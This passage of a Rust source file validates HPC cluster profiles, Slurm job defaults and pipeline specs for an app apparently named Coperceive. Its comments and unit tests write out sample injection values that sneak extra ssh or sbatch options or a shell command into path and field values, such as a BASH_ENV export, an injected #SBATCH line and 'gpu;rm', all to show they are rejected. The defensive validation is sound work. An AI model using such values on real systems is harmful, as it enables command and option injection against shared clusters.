// SPDX-License-Identifier: Apache-2.0
//! Serde mirrors of the cluster profile, scheduler discovery and pipeline spec.
//!
//! This is the Rust side of the product-neutral HPC workspace contract defined by
//! `docs/adr/0015-cluster-profiles-scheduler-adapter.md` and the JSON schemas in
//! `docs/spec/`. Nothing here has a site-specific default: no partition, host,
//! account, path or GRES name is baked in. Python owns scheduler discovery and
//! job rendering for now; these types keep the desktop UI and the sidecar on the
//! same contract.

use serde::{Deserialize, Serialize};

/// Lexically normalise a server path and refuse any `..` segment.
///
/// No symlink resolution happens here (that is the SSH-side job); this removes
/// `.`/empty segments and collapses duplicate slashes so a containment check
/// cannot be fooled by `<results_root>/../<scratch>/x` or `a/../../b`.
pub(crate) fn normalise_path(path: &str, field: &str) -> Result<String, String> {
    if path.is_empty() {
        return Err(format!("{field} must not be empty."));
    }
    if path.contains('\0') {
        return Err(format!("{field} must not contain a NUL byte."));
    }
    if path.chars().any(char::is_control) {
        return Err(format!(
            "{field} must not contain a line break or other control character, got {path:?}."
        ));
    }
    if !(path.starts_with('/') || path.starts_with('~')) {
        return Err(format!("{field} must be an absolute or ~ path, got {path:?}."));
    }
    let (prefix, rest) = if path.starts_with('~') {
        let rest = &path[1..];
        if !rest.is_empty() && !rest.starts_with('/') {
            return Err(format!("{field} must be ~/..., got {path:?}."));
        }
        // "~" alone has no rest; slicing [1..] on it would panic.
        ("~", if rest.is_empty() { "" } else { &rest[1..] })
    } else {
        ("", &path[1..])
    };
    let mut parts: Vec<&str> = Vec::new();
    for segment in rest.split('/') {
        match segment {
            "" | "." => {}
            ".." => {
                return Err(format!(
                    "{field} must not contain a '..' segment, got {path:?}."
                ))
            }
            other => parts.push(other),
        }
    }
    let body = parts.join("/");
    if prefix == "~" {
        Ok(if body.is_empty() {
            "~".to_string()
        } else {
            format!("~/{body}")
        })
    } else {
        Ok(format!("/{body}"))
    }
}

/// Characters a results or code folder may not contain. Job scripts write
/// `results_root` inside double quotes (`OUT_DIR="<results_root>/runs/<id>"`),
/// where bash still expands `$`, runs backticks, and ends the string at `"`; a
/// backslash escapes the closing quote.
const SCRIPT_PATH_FORBIDDEN: [char; 4] = ['$', '`', '"', '\\'];

/// Refuses a path that a job script would interpret instead of using as text:
/// a line break or other control character (an `#SBATCH --output=<path>` line
/// would become a shell command) or one of [`SCRIPT_PATH_FORBIDDEN`].
fn validate_script_path(path: &str, label: &str) -> Result<(), String> {
    if path.chars().any(char::is_control) {
        return Err(format!(
            "The {label} {path:?} contains a line break or control character, which is not a \
             valid path."
        ));
    }
    if let Some(found) = path.chars().find(|ch| SCRIPT_PATH_FORBIDDEN.contains(ch)) {
        return Err(format!(
            "The {label} {path:?} contains {found:?}. Job scripts use this path, so it may not \
             contain $, a backtick, a double quote or a backslash. Choose a folder whose path has \
             none of these."
        ));
    }
    Ok(())
}

/// Characters sbatch treats specially inside an `#SBATCH` line, besides
/// whitespace: an unquoted '#' ends the line, and quotes group text (an
/// unmatched one makes sbatch refuse the script).
const SBATCH_PATH_FORBIDDEN: [char; 3] = ['#', '\'', '"'];

/// Refuses a path that sbatch would not read as one argument when it is written
/// unquoted into `#SBATCH --output=<path>/...` and `#SBATCH --error=<path>/...`.
/// sbatch splits each directive line at whitespace and hands every piece to its
/// option parser, so `/x --export=ALL,BASH_ENV=/evil.sh #` would add a job option.
pub fn validate_sbatch_path(path: &str, label: &str) -> Result<(), String> {
    let found = path
        .chars()
        .find(|ch| ch.is_whitespace() || SBATCH_PATH_FORBIDDEN.contains(ch));
    if let Some(found) = found {
        let what = if found.is_whitespace() {
            "a space".to_string()
        } else {
            format!("{found:?}")
        };
        return Err(format!(
            "The {label} {path:?} contains {what}. Slurm reads this folder from the job \
             script's #SBATCH --output and --error lines, which it splits at spaces and cuts at \
             '#', so the path may not contain spaces, '#' or quotes. Choose a folder whose path \
             has none of these, for example /data/my_lab/runs."
        ));
    }
    Ok(())
}

/// Validates and normalises a profile's `results_root`, the shared folder every
/// job script writes its logs and outputs to.
///
/// It must be a plain absolute path: job scripts and the plan checks use it
/// quoted, where `~` is never expanded, so a `~` root would point at a folder
/// literally named `~`.
pub fn validate_results_root(path: &str) -> Result<String, String> {
    validate_script_path(path, "results folder")?;
    validate_sbatch_path(path, "results folder")?;
    if path.starts_with('~') {
        return Err(format!(
            "The results folder {path:?} must be an absolute path on the cluster, starting with \
             '/'. Job scripts do not expand '~', so type the full path, for example \
             /home/<you>/results."
        ));
    }
    normalise_path(path, "results_root")
}

/// Validates and normalises one of a profile's `code_roots`. A `~/...` root stays
/// allowed like a data root: the plan checks expand it against the remote HOME.
pub fn validate_code_root(path: &str) -> Result<String, String> {
    validate_script_path(path, "code folder")?;
    normalise_path(path, "code root")
}

/// ssh reads any argument that starts with '-' as an option (for example
/// `-oProxyCommand=...`), so no part of the destination may start with one.
fn reject_option_like(value: &str, what: &str) -> Result<(), String> {
    if value.trim_start().starts_with('-') {
        return Err(format!(
            "{what} {value:?} may not start with '-': ssh would read it as an option."
        ));
    }
    Ok(())
}

/// True when normalised `child` equals or is inside normalised `root`.
pub(crate) fn is_under(child: &str, root: &str) -> bool {
    let root = root.trim_end_matches('/');
    let root = if root.is_empty() { "/" } else { root };
    child == root || child.starts_with(&format!("{root}/"))
}

/// Scratch templates are expanded inside a job script, so they may contain only
/// plain path characters plus the four literal tokens Coperceive controls.
pub fn validate_scratch_template(template: &str) -> Result<(), String> {
    let text = template.trim();
    if text.is_empty() {
        return Err(
            "A per-user scratch path is required for job work, for example \
             /scratch/$USER/$SLURM_JOB_ID."
                .into(),
        );
    }
    if !text.starts_with('/') {
        return Err(format!(
            "The scratch folder {text:?} must be an absolute path on the cluster."
        ));
    }
    let mut rest = text;
    while let Some(index) = rest.find('$') {
        validate_scratch_plain(&rest[..index])?;
        let after = &rest[index + 1..];
        if let Some(stripped) = after.strip_prefix('{') {
            let Some(end) = stripped.find('}') else {
                return Err(
                    "The scratch folder has an unterminated ${...} token; close it with '}'."
                        .to_string(),
                );
            };
            let name = &stripped[..end];
            if !matches!(name, "USER" | "SLURM_JOB_ID") {
                return Err(format!(
                    "The scratch folder uses ${{{name}}}, which Coperceive does not expand. \
                     Use $USER or $SLURM_JOB_ID."
                ));
            }
            rest = &stripped[end + 1..];
        } else {
            let length = after
                .char_indices()
                .take_while(|(_, ch)| ch.is_ascii_alphanumeric() || *ch == '_')
                .map(|(offset, ch)| offset + ch.len_utf8())
                .last()
                .unwrap_or(0);
            let name = &after[..length];
            if !matches!(name, "USER" | "SLURM_JOB_ID") {
                return Err(format!(
                    "The scratch folder uses ${name}, which Coperceive does not expand. \
                     Use $USER or $SLURM_JOB_ID."
                ));
            }
            rest = &after[length..];
        }
    }
    validate_scratch_plain(rest)?;
    if text.split('/').any(|segment| segment == "..") {
        return Err("The scratch folder may not contain a '..' segment.".to_string());
    }
    Ok(())
}

fn validate_scratch_plain(text: &str) -> Result<(), String> {
    for ch in text.chars() {
        if ch.is_ascii_alphanumeric() || matches!(ch, '_' | '.' | '/' | '-') {
            continue;
        }
        return Err(format!(
            "The scratch folder contains {ch:?}; use only letters, digits, '_', '.', '/', '-' \
             and the tokens $USER, ${{USER}}, $SLURM_JOB_ID, ${{SLURM_JOB_ID}}."
        ));
    }
    Ok(())
}

/// The saved coperceive command followed by one subcommand and its arguments.
/// Every remote call must use this instead of a bare `coperceive`, because a
/// per-user install may only be importable by its venv interpreter.
pub fn coperceive_argv(profile: &ServerProfile, args: &[String]) -> Vec<String> {
    let mut argv = profile.environment.coperceive_command.clone();
    if argv.is_empty() {
        argv.push("coperceive".to_string());
    }
    argv.extend(args.iter().cloned());
    argv
}

fn static_scratch_prefix(template: &str) -> String {
    let prefix = template.split('$').next().unwrap_or("").trim_end_matches('/');
    if prefix.is_empty() {
        return String::new();
    }
    normalise_path(prefix, "scratch prefix").unwrap_or_else(|_| prefix.to_string())
}

/// A per-server profile created by the user. It never contains credentials.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ServerProfile {
    pub name: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub ssh_alias: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub host: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub user: Option<String>,
    pub data_roots: Vec<String>,
    pub scratch_template: String,
    /// Shared filesystem the login node can read; every run output lives here,
    /// never under scratch.
    pub results_root: String,
    /// Directories a registered pipeline script may live in, besides data_roots.
    #[serde(default)]
    pub code_roots: Vec<String>,
    pub scheduler: SchedulerKind,
    pub defaults: JobDefaults,
    pub environment: EnvironmentSetup,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub notes: Option<String>,
}

impl ServerProfile {
    /// The argv element to ssh to: the configured alias, or user@host.
    ///
    /// Refuses a part that starts with '-' even for a profile that was never
    /// validated (Test connection runs before a profile is saved).
    pub fn ssh_target(&self) -> Result<String, String> {
        self.reject_option_like_destination()?;
        if let Some(alias) = &self.ssh_alias {
            return Ok(alias.clone());
        }
        match &self.host {
            Some(host) => match &self.user {
                Some(user) => Ok(format!("{user}@{host}")),
                None => Ok(host.clone()),
            },
            None => Err(
                "Choose a host from ~/.ssh/config or type a host name. Coperceive never \
                 asks for a password or a private key."
                    .into(),
            ),
        }
    }

    fn reject_option_like_destination(&self) -> Result<(), String> {
        if let Some(alias) = &self.ssh_alias {
            reject_option_like(alias, "The SSH host name")?;
        }
        if let Some(host) = &self.host {
            reject_option_like(host, "The host name")?;
        }
        if let Some(user) = &self.user {
            reject_option_like(user, "The user name")?;
        }
        Ok(())
    }

    /// Reject the shapes the UI must never save (both alias and host, no roots, no scratch).
    pub fn validate(&self) -> Result<(), String> {
        if self.name.trim().is_empty() {
            return Err("The server needs a name.".into());
        }
        if self.ssh_alias.is_some() && self.host.is_some() {
            return Err("Set either ssh_alias or host, not both.".into());
        }
        if self.ssh_alias.is_none() && self.host.is_none() {
            return Err(
                "Choose a host from ~/.ssh/config or type a host name. Coperceive never \
                 asks for a password or a private key."
                    .into(),
            );
        }
        self.reject_option_like_destination()?;
        if self.data_roots.is_empty() {
            return Err("Add at least one data root on the server.".into());
        }
        for root in &self.data_roots {
            if !root.starts_with('/') && !root.starts_with('~') {
                return Err(format!(
                    "Data root {root:?} must be an absolute or ~ path on the server."
                ));
            }
        }
        validate_scratch_template(&self.scratch_template)?;
        if self.results_root.trim().is_empty() {
            return Err(
                "A results root is required: the shared filesystem where run outputs and \
                 predictions.jsonl live, readable from the login node."
                    .into(),
            );
        }
        let results_root = validate_results_root(&self.results_root)?;
        let scratch_prefix = static_scratch_prefix(&self.scratch_template);
        if !scratch_prefix.is_empty() && is_under(&results_root, &scratch_prefix) {
            return Err(format!(
                "results_root {:?} is inside the scratch area {scratch_prefix:?}. \
                 Outputs must go to shared storage, not scratch.",
                self.results_root
            ));
        }
        for root in &self.code_roots {
            validate_code_root(root)?;
        }
        self.defaults.validate()?;
        self.environment.validate()?;
        Ok(())
    }

    /// A run's --output-dir must normalise inside results_root and never scratch.
    pub fn validate_output_dir(&self, path: &str) -> Result<(), String> {
        if self.results_root.trim().is_empty() {
            return Err("Set results_root on the server profile first.".into());
        }
        // The run script writes this path inside double quotes (OUT_DIR="...").
        validate_script_path(path, "output folder")?;
        let output = normalise_path(path, "output directory")?;
        let results_root = normalise_path(&self.results_root, "results_root")?;
        if !is_under(&output, &results_root) {
            return Err(format!(
                "The output directory {path:?} is outside results_root {:?} (after \
                 normalising paths).",
                self.results_root
            ));
        }
        let scratch_prefix = static_scratch_prefix(&self.scratch_template);
        if !scratch_prefix.is_empty() && is_under(&output, &scratch_prefix) {
            return Err(
                "The output directory cannot be under scratch; scratch is temporary job work \
                 and outputs live under results_root."
                    .into(),
            );
        }
        Ok(())
    }

    /// A pipeline script must sit inside code_roots or data_roots.
    pub fn validate_pipeline_script(&self, script: &str) -> Result<(), String> {
        if script.is_empty() {
            return Err("Pipeline script must not be empty.".into());
        }
        if script.contains('\0') {
            return Err("Pipeline script must not contain a NUL byte.".into());
        }
        if script.split('/').any(|part| part == "..") {
            return Err(format!(
                "Pipeline script {script:?} must not contain a '..' segment."
            ));
        }
        let roots: Vec<String> = self
            .code_roots
            .iter()
            .chain(self.data_roots.iter())
            .filter(|root| !root.trim().is_empty())
            .map(|root| normalise_path(root, "code/data root"))
            .collect::<Result<_, _>>()?;
        if roots.is_empty() {
            return Err(
                "Add a code root or a data root before registering a pipeline script.".into(),
            );
        }
        if script.starts_with('/') {
            let normalised = normalise_path(script, "pipeline script")?;
            if !roots.iter().any(|root| is_under(&normalised, root)) {
                return Err(format!(
                    "Pipeline script {script:?} is outside code_roots and data_roots after \
                     normalising paths."
                ));
            }
        }
        Ok(())
    }

}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum SchedulerKind {
    Slurm,
    None,
}

/// Scheduler choices the user confirmed. All optional; a missing partition is
/// asked for, never guessed by the product.
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct JobDefaults {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub partition: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub account: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub qos: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub gres: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub time_limit: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub memory: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub cpus_per_task: Option<u32>,
}

impl JobDefaults {
    pub fn validate(&self) -> Result<(), String> {
        for (field, value, allowed) in [
            ("partition", &self.partition, SLURM_PARTITION_CHARS),
            ("account", &self.account, SLURM_ACCOUNT_CHARS),
            ("qos", &self.qos, SLURM_ACCOUNT_CHARS),
            ("gres", &self.gres, SLURM_GRES_CHARS),
        ] {
            if let Some(text) = value {
                validate_token(field, text, allowed)?;
            }
        }
        if let Some(text) = self.time_limit.as_deref() {
            validate_slurm_time_limit(text)?;
        }
        if let Some(text) = self.memory.as_deref() {
            validate_slurm_memory(text)?;
        }
        if let Some(cpus) = self.cpus_per_task {
            if cpus < 1 {
                return Err("defaults.cpus_per_task must be at least 1.".into());
            }
        }
        Ok(())
    }
}

/// Characters a Slurm partition name may contain (the profile's discovery value).
const SLURM_PARTITION_CHARS: &str =
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-.,";
/// Characters an account or QoS name may contain.
const SLURM_ACCOUNT_CHARS: &str =
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-.";
/// Characters a GRES string may contain (gpu:a100:1, gpu:2, ...).
const SLURM_GRES_CHARS: &str =
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_:.,-";

fn validate_token(field: &str, text: &str, allowed: &str) -> Result<(), String> {
    if text.trim().is_empty() {
        return Err(format!("defaults.{field} must not be empty."));
    }
    if text.chars().any(|ch| ch.is_whitespace() || ch.is_control()) {
        return Err(format!(
            "defaults.{field} must not contain spaces, newlines or control characters."
        ));
    }
    if !text.chars().all(|ch| allowed.contains(ch)) {
        return Err(format!(
            "defaults.{field} has an unexpected character; allowed are letters, digits, '_', \
             '-' and '.'{}.",
            if field == "partition" {
                ", and ','"
            } else if field == "gres" {
                ", ':' and ','"
            } else {
                ""
            }
        ));
    }
    Ok(())
}

/// Validate a Slurm time limit: HH:MM:SS, D-HH:MM:SS, or "UNLIMITED".
fn validate_slurm_time_limit(text: &str) -> Result<(), String> {
    if text.eq_ignore_ascii_case("UNLIMITED") {
        return Ok(());
    }
    if text.chars().any(|ch| ch.is_whitespace() || ch.is_control()) {
        return Err(
            "Walltime must not contain spaces, newlines or control characters.".into(),
        );
    }
    let (days, clock) = match text.split_once('-') {
        Some((days, clock)) => {
            if days.is_empty() || !days.chars().all(|ch| ch.is_ascii_digit()) {
                return Err(format!(
                    "Walltime {text:?} is not a Slurm time; use HH:MM:SS or D-HH:MM:SS."
                ));
            }
            (
                days.parse::<u64>()
                    .map_err(|_| format!("Walltime {text:?} has too many days."))?,
                clock,
            )
        }
        None => (0, text),
    };
    let parts: Vec<&str> = clock.split(':').collect();
    if parts.len() != 3
        || parts
            .iter()
            .any(|part| part.is_empty() || !part.chars().all(|ch| ch.is_ascii_digit()))
    {
        return Err(format!(
            "Walltime {text:?} is not a Slurm time; use HH:MM:SS or D-HH:MM:SS."
        ));
    }
    let hours = parts[0]
        .parse::<u64>()
        .map_err(|_| "Invalid time hours.".to_string())?;
    let minutes = parts[1]
        .parse::<u64>()
        .map_err(|_| "Invalid time minutes.".to_string())?;
    let seconds = parts[2]
        .parse::<u64>()
        .map_err(|_| "Invalid time seconds.".to_string())?;
    if days == 0 && hours > 23 {
        return Err(format!(
            "Walltime {text:?} has more than 23 hours; use D-HH:MM:SS for multi-day limits."
        ));
    }
    if minutes > 59 || seconds > 59 {
        return Err(format!(
            "Walltime {text:?} is not a Slurm time; minutes and seconds must be 0-59."
        ));
    }
    Ok(())
}

/// Validate a Slurm memory value: a positive integer with an optional K/M/G/T unit.
fn validate_slurm_memory(text: &str) -> Result<(), String> {
    if text.chars().any(|ch| ch.is_whitespace() || ch.is_control()) {
        return Err(
            "defaults.memory must not contain spaces, newlines or control characters.".into(),
        );
    }
    let (number, unit) = match text.chars().last() {
        Some(ch) if ch.is_ascii_alphabetic() => (&text[..text.len() - 1], Some(ch)),
        _ => (text, None),
    };
    if let Some(unit) = unit {
        if !"KMGTkmgt".contains(unit) {
            return Err(format!(
                "defaults.memory {text:?} has an unknown unit; use K, M, G or T (e.g. 16G)."
            ));
        }
    }
    if number.is_empty() || !number.chars().all(|ch| ch.is_ascii_digit()) || number == "0" {
        return Err(format!(
            "defaults.memory {text:?} is not a Slurm memory size; use a number with an optional \
             K/M/G/T unit (e.g. 16G)."
        ));
    }
    Ok(())
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct EnvironmentSetup {
    pub kind: EnvironmentKind,
    #[serde(default)]
    pub modules: Vec<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub interpreter: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub container_image: Option<String>,
    #[serde(default = "default_coperceive_command")]
    pub coperceive_command: Vec<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub wheelhouse: Option<String>,
    #[serde(default)]
    pub compute_has_internet: bool,
}

fn default_coperceive_command() -> Vec<String> {
    vec!["coperceive".to_string()]
}

impl Default for EnvironmentSetup {
    fn default() -> Self {
        Self {
            kind: EnvironmentKind::None,
            modules: Vec::new(),
            interpreter: None,
            container_image: None,
            coperceive_command: default_coperceive_command(),
            wheelhouse: None,
            compute_has_internet: false,
        }
    }
}

impl EnvironmentSetup {
    pub fn validate(&self) -> Result<(), String> {
        match self.kind {
            EnvironmentKind::Modules if self.modules.is_empty() => {
                return Err("Modules environment needs at least one module.".into())
            }
            EnvironmentKind::Conda if self.interpreter.is_none() => {
                return Err("Conda environment needs the path to its python.".into())
            }
            EnvironmentKind::Venv if self.interpreter.is_none() => {
                return Err("Virtualenv environment needs the path to its python.".into())
            }
            EnvironmentKind::Container if self.container_image.is_none() => {
                return Err("Container environment needs the image path.".into())
            }
            _ => {}
        }
        if self.coperceive_command.is_empty()
            || self.coperceive_command.iter().any(|part| part.is_empty())
        {
            return Err("The command that starts coperceive is empty. Choose the Python interpreter under Environment, or use the discovered settings.".into());
        }
        Ok(())
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum EnvironmentKind {
    None,
    Modules,
    Conda,
    Venv,
    Container,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct PipelineSpec {
    pub name: String,
    pub script: String,
    pub interpreter: Vec<String>,
    pub environment: EnvironmentSetup,
    #[serde(default)]
    pub arguments: Vec<ArgumentSpec>,
    #[serde(default = "default_output_contract")]
    pub output_contract: String,
    #[serde(default)]
    pub description: String,
}

fn default_output_contract() -> String {
    "coperceive-pipeline-1".to_string()
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ArgumentRole {
    Checkpoint,
    TestData,
    Config,
    Output,
    #[default]
    Other,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ArgumentSpec {
    pub name: String,
    pub kind: ArgumentKind,
    #[serde(default)]
    pub help: String,
    #[serde(default)]
    pub required: bool,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub default: Option<serde_json::Value>,
    #[serde(default)]
    pub choices: Vec<String>,
    #[serde(default)]
    pub multiple: bool,
    /// What the argument points at, so the UI can offer a remote-scan picker.
    #[serde(default)]
    pub role: ArgumentRole,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ArgumentKind {
    Str,
    Int,
    Float,
    Bool,
    Path,
    Enum,
}

impl PipelineSpec {
    /// Script must stay inside the profile's data roots: relative, no `..`.
    pub fn validate(&self) -> Result<(), String> {
        if self.name.is_empty() {
            return Err("Pipeline name is required.".into());
        }
        if self.script.is_empty() || self.script.split('/').any(|part| part == "..") {
            return Err("Pipeline script must not be empty or contain '..'.".into());
        }
        if self.interpreter.is_empty() {
            return Err("Pipeline interpreter must have at least one argv element.".into());
        }
        if self.output_contract != default_output_contract() {
            return Err(format!(
                "Unsupported output contract {:?}.",
                self.output_contract
            ));
        }
        self.environment.validate()
    }
}

/// One partition as discovery offered it. Read-only facts, shown as choices.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct DiscoveredPartition {
    pub name: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub nodes: Option<u64>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub state: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub max_time: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub gres: Option<String>,
    #[serde(default)]
    pub gpu_types: Vec<String>,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Discovery {
    pub scheduler: SchedulerKind,
    #[serde(default)]
    pub partitions: Vec<DiscoveredPartition>,
    #[serde(default)]
    pub gpu_types: Vec<String>,
}

/// Everything the app needs from a scheduler. PBS/LSF extend this later.
pub trait SchedulerAdapter {
    fn discover(&self) -> Result<Discovery, String>;
    fn render_job_script(
        &self,
        profile: &ServerProfile,
        request: &JobRequest,
    ) -> Result<String, String>;
    fn submit(&self, script: &str) -> Result<String, String>;
    fn status(&self, job_id: &str) -> Result<JobState, String>;
    fn cancel(&self, job_id: &str) -> Result<(), String>;
    fn logs(&self, job_id: &str) -> Result<String, String>;
    fn list_own_jobs(&self) -> Result<Vec<(String, JobState)>, String>;
}

/// One heavy job. Every field is a user/profile choice; there is no default.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct JobRequest {
    pub job_name: String,
    pub command_argv: Vec<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub partition: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub account: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub qos: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub gres: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub time_limit: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub memory: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub cpus_per_task: Option<u32>,
}

impl JobRequest {
    pub fn validate(&self) -> Result<(), String> {
        if !self.job_name.starts_with("coperceive-") {
            return Err(format!(
                "App job names must start with 'coperceive-' so the app can find the jobs \
                 it created; got {:?}.",
                self.job_name
            ));
        }
        if self.command_argv.is_empty() || self.command_argv.iter().any(|part| part.is_empty()) {
            return Err("A job needs a non-empty command argv.".into());
        }
        Ok(())
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum JobState {
    Pending,
    Running,
    Completed,
    Failed,
    Cancelled,
    Unknown,
}

#[cfg(test)]
mod tests {
    use super::*;

    fn alpha() -> ServerProfile {
        ServerProfile {
            name: "Alpha lab".into(),
            ssh_alias: Some("alpha-cluster".into()),
            host: None,
            user: None,
            data_roots: vec!["/data/projects/alpha".into()],
            scratch_template: "/scratch/$USER/$SLURM_JOB_ID".into(),
            results_root: "/data/projects/alpha/runs".into(),
            code_roots: vec!["/data/projects/alpha/code".into()],
            scheduler: SchedulerKind::Slurm,
            defaults: JobDefaults {
                partition: Some("gpu-a100".into()),
                gres: Some("gpu:a100:1".into()),
                ..JobDefaults::default()
            },
            environment: EnvironmentSetup {
                kind: EnvironmentKind::Modules,
                modules: vec!["python/3.12".into()],
                ..EnvironmentSetup::default()
            },
            notes: None,
        }
    }

    #[test]
    fn profile_round_trips_and_uses_alias() {
        let profile = alpha();
        profile.validate().expect("valid profile");
        let text = serde_json::to_string(&profile).expect("json");
        let back: ServerProfile = serde_json::from_str(&text).expect("back");
        assert_eq!(back, profile);
        assert_eq!(back.ssh_target().expect("target"), "alpha-cluster");
    }

    #[test]
    fn profile_requires_a_host_and_roots() {
        let mut profile = alpha();
        profile.ssh_alias = None;
        assert!(profile.validate().is_err());
        profile.host = Some("login.example".into());
        profile.user = Some("bob".into());
        assert_eq!(profile.ssh_target().expect("target"), "bob@login.example");
        profile.data_roots.clear();
        assert!(profile.validate().is_err());
    }

    #[test]
    fn unknown_fields_and_credentials_are_refused() {
        let mut value = serde_json::to_value(alpha()).expect("value");
        value["password"] = serde_json::json!("hunter2");
        assert!(serde_json::from_value::<ServerProfile>(value).is_err());
    }

    #[test]
    fn job_names_are_prefixed_and_need_a_command() {
        let request = JobRequest {
            job_name: "my-job".into(),
            command_argv: vec!["true".into()],
            partition: Some("compute".into()),
            account: None,
            qos: None,
            gres: None,
            time_limit: None,
            memory: None,
            cpus_per_task: None,
        };
        assert!(request.validate().is_err());
        let mut ok = request;
        ok.job_name = "coperceive-eval".into();
        ok.validate().expect("valid job");
    }

    #[test]
    fn job_defaults_validate_time_memory_and_names() {
        // Valid values.
        JobDefaults {
            partition: Some("gpu-a100".into()),
            account: Some("research".into()),
            qos: Some("normal".into()),
            gres: Some("gpu:a100:1".into()),
            time_limit: Some("02:30:00".into()),
            memory: Some("16G".into()),
            ..JobDefaults::default()
        }
        .validate()
        .expect("valid defaults");
        JobDefaults {
            time_limit: Some("1-12:00:00".into()),
            ..JobDefaults::default()
        }
        .validate()
        .expect("multi-day time");
        JobDefaults {
            memory: Some("64000M".into()),
            ..JobDefaults::default()
        }
        .validate()
        .expect("memory with unit");
        // Invalid values, with plain messages.
        for (defaults, needle) in [
            (
                JobDefaults {
                    time_limit: Some("two hours".into()),
                    ..JobDefaults::default()
                },
                "Walltime",
            ),
            (
                JobDefaults {
                    time_limit: Some("01:60:00".into()),
                    ..JobDefaults::default()
                },
                "minutes and seconds",
            ),
            (
                JobDefaults {
                    time_limit: Some("25:00:00".into()),
                    ..JobDefaults::default()
                },
                "D-HH:MM:SS",
            ),
            (
                JobDefaults {
                    time_limit: Some("01:00:00\n#SBATCH --partition=evil".into()),
                    ..JobDefaults::default()
                },
                "spaces, newlines",
            ),
            (
                JobDefaults {
                    memory: Some("a lot".into()),
                    ..JobDefaults::default()
                },
                "memory",
            ),
            (
                JobDefaults {
                    memory: Some("16GB".into()),
                    ..JobDefaults::default()
                },
                "unknown unit",
            ),
            (
                JobDefaults {
                    memory: Some("16G\n".into()),
                    ..JobDefaults::default()
                },
                "spaces, newlines",
            ),
            (
                JobDefaults {
                    partition: Some("gpu;rm".into()),
                    ..JobDefaults::default()
                },
                "unexpected character",
            ),
            (
                JobDefaults {
                    partition: Some("gpu\nmain".into()),
                    ..JobDefaults::default()
                },
                "spaces, newlines",
            ),
        ] {
            let error = defaults.validate().expect_err("invalid defaults");
            assert!(
                error.contains(needle),
                "message {error:?} should mention {needle:?}"
            );
        }
    }

    #[test]
    fn empty_coperceive_command_names_the_field_a_user_can_fix() {
        let environment = EnvironmentSetup {
            coperceive_command: Vec::new(),
            ..EnvironmentSetup::default()
        };
        let error = environment.validate().expect_err("empty command must be refused");
        assert!(error.contains("command that starts coperceive"), "{error}");
        assert!(error.contains("Python interpreter"), "{error}");
        assert!(!error.contains("coperceive_command"), "{error}");
    }

    #[test]
    fn coperceive_argv_prefixes_the_saved_command() {
        let mut profile = alpha();
        profile.environment.coperceive_command = vec![
            "/home/u/venv/bin/python".to_string(),
            "-m".to_string(),
            "coperceive".to_string(),
        ];
        assert_eq!(
            coperceive_argv(&profile, &["remote".to_string(), "scan".to_string()]),
            vec![
                "/home/u/venv/bin/python",
                "-m",
                "coperceive",
                "remote",
                "scan"
            ]
        );
    }

    #[test]
    fn scratch_templates_allow_only_plain_paths_and_known_tokens() {
        for good in [
            "/scratch/$USER/$SLURM_JOB_ID",
            "/scratch/${USER}/${SLURM_JOB_ID}/work",
            "/local/alice",
            "/data/scratch_1/run-2",
        ] {
            validate_scratch_template(good).unwrap_or_else(|error| panic!("{good}: {error}"));
        }
